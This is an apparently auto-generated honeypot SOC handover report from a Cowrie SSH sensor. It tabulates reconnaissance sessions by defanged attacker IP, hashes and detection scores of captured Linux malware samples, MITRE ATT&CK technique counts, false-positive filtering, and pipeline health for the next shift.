## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `194.124.210[.]127` | **23** | 2026-06-13 15:14 | 2026-06-13 17:25 | 3m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.187.146[.]72` | **20** | 2026-06-13 15:35 | 2026-06-13 16:14 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.135.40[.]101` | **20** | 2026-06-13 15:45 | 2026-06-13 15:49 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `76.81.71[.]226` | **15** | 2026-06-13 14:07 | 2026-06-13 14:34 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.119[.]177` | **10** | 2026-06-13 15:14 | 2026-06-13 15:20 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `118.139.164[.]171` | **3** | 2026-06-13 15:10 | 2026-06-13 15:14 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `5.178.87[.]159` | **3** | 2026-06-13 15:46 | 2026-06-13 15:59 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `115.191.66[.]84` | 1 | 2026-06-13 14:14 | 2026-06-13 14:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]250` | 1 | 2026-06-13 16:02 | 2026-06-13 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `125.39.93[.]73` | 1 | 2026-06-13 15:16 | 2026-06-13 15:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.119.71[.]11` | 1 | 2026-06-13 17:13 | 2026-06-13 17:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-06-13 15:15 | 2026-06-13 15:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-06-13 16:07 | 2026-06-13 16:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.154.133[.]105` | 1 | 2026-06-13 15:32 | 2026-06-13 15:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.122.171[.]64` | 1 | 2026-06-13 16:19 | 2026-06-13 16:20 | 31s | 0 | `T1592` | 🟢 LOW |
| `37.27.214[.]143` | 1 | 2026-06-13 17:18 | 2026-06-13 17:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.106.178[.]197` | 1 | 2026-06-13 15:14 | 2026-06-13 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]100` | 1 | 2026-06-13 14:42 | 2026-06-13 14:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]101` | 1 | 2026-06-13 14:43 | 2026-06-13 14:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]102` | 1 | 2026-06-13 14:43 | 2026-06-13 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]13` | 1 | 2026-06-13 14:42 | 2026-06-13 14:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]36` | 1 | 2026-06-13 14:45 | 2026-06-13 14:45 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]55` | 1 | 2026-06-13 14:45 | 2026-06-13 14:45 | 2s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.190.119[.]177` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 25 |
| `139.135.40[.]101` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 5 |
| `91.231.89[.]55` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `120.209.186[.]110` | CN | China Mobile Communications Corporation | **100** ⚠️ | 28 |
| `91.196.152[.]13` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `160.119.71[.]11` | NL | Cloud Hosting | **100** ⚠️ | 11 |
| `91.196.152[.]101` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `103.187.146[.]72` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 50 |
| `183.250.89[.]44` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `220.154.133[.]105` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 106 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 145 cases |
| Tool 34  | Credential Extractor        | ✅ 80 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (9.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 94 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-13T17:27:26Z_
